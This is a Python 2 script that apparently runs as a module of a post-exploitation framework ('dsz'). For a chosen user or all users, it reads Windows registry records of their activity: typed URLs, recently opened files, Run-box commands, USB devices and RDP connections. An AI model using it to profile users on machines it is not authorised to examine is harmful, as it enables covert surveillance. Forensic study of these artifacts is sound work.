
import dsz
import dsz.file
import dsz.lp
import dsz.menu
import dsz.payload
import dsz.version
import glob
import os
import re
import shutil
import sys
import datetime
import codecs

def print_header(text):
    print '\n----------------------------------------------------------------'
    print ('---- %s' % text)

def user_to_sid(user):
    if dsz.cmd.Run(('sidlookup -name %s' % user), dsz.RUN_FLAG_RECORD):
        return dsz.cmd.data.Get('Sid::Id', dsz.TYPE_STRING)[0]
    else:
        return False

def sid_to_name(user):
    if dsz.cmd.Run(('sidlookup -name %s' % user), dsz.RUN_FLAG_RECORD):
        return dsz.cmd.data.Get('Sid::Name', dsz.TYPE_STRING)[0]
    else:
        return False

def null_function(v):
    return v

def display_registryquery(query, formatting_callback=null_function):
    if dsz.cmd.Run(('registryquery %s' % query), dsz.RUN_FLAG_RECORD):
        for v in dsz.cmd.data.Get('Key::Value::value', dsz.TYPE_STRING):
            print ('%s' % formatting_callback(v))
    else:
        dsz.ui.Echo('No results', dsz.ERROR)

def user_assist(sid):
    print_header('User Assist')
    dsz.control.echo.On()
    dsz.cmd.Run(('history -type user -user %s' % sid))
    dsz.control.echo.Off()

def media_player_recent(sid):
    print_header('Windows Media Player')
    display_registryquery(('-hive U -key "%s\\Software\\Microsoft\\MediaPlayer\\Player\\RecentFileList" -recursive' % sid))

def internet_explorer_typed_urls(sid):
    print_header('Internet Explorer - Typed Urls')
    display_registryquery(('-hive U -key "%s\\Software\\Microsoft\\Internet Explorer\\TypedURLs" -recursive' % sid))

def explorer_dialogs(sid):
    print_header('Windows Explorer')
    display_registryquery(('-hive U -key "%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU" -recursive' % sid))

def usb_devices(sid):
    print_header('Recent USB Devices')
    if dsz.cmd.Run('registryquery -hive L -key "System\\CurrentControlSet\\Control\\DeviceClasses\\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}"', dsz.RUN_FLAG_RECORD):
        for v in dsz.cmd.data.Get('Key::Subkey', dsz.TYPE_OBJECT):
            print ('[%s] %s' % (dsz.cmd.data.ObjectGet(v, 'updateDate', dsz.TYPE_STRING)[0], dsz.cmd.data.ObjectGet(v, 'name', dsz.TYPE_STRING)[0]))

def start_run(sid):
    print_header('Start->Run')
    display_registryquery(('-hive U -key "%s\\software\\microsoft\\windows\\currentversion\\explorer\\runmru"' % sid), (lambda v: v[:(-2)]))

def rdp_history(sid):
    print_header('RDP History')
    display_registryquery(('-hive U -key "%s\\Software\\Microsoft\\Terminal Server Client\\Default"' % sid))

def do_user(sid):
    commands = [user_assist, media_player_recent, internet_explorer_typed_urls, explorer_dialogs, usb_devices, start_run, rdp_history]
    for f in commands:
        try:
            f(sid)
        except:
            print (str(f) + ' failed')

def do_all_users():
    if dsz.cmd.Run('registryquery -hive U', dsz.RUN_FLAG_RECORD):
        for sid in dsz.cmd.data.Get('Key::Subkey::name', dsz.TYPE_STRING):
            if ((len(sid) > 42) and (len(sid) < 49)):
                userName = sid_to_name(sid)
                print '\n================================================================'
                print ('Querying user: %s' % sid_to_name(sid))
                print '================================================================'
                do_user(sid)

def main(argv):
    dsz.control.echo.Off()
    params = dsz.lp.cmdline.ParseCommandLine(argv, 'userquery.txt')
    userName = ''
    allUsers = False
    if params.has_key('all'):
        allUsers = True
    if params.has_key('user'):
        userName = params['user'][0]
    if ((not userName) and (not allUsers)):
        print 'Either user or all must be specified'
        return False
    if userName:
        do_user(user_to_sid(userName))
    elif allUsers:
        do_all_users()
    return True
if (__name__ == '__main__'):
    if (main(sys.argv) != True):
        sys.exit((-1))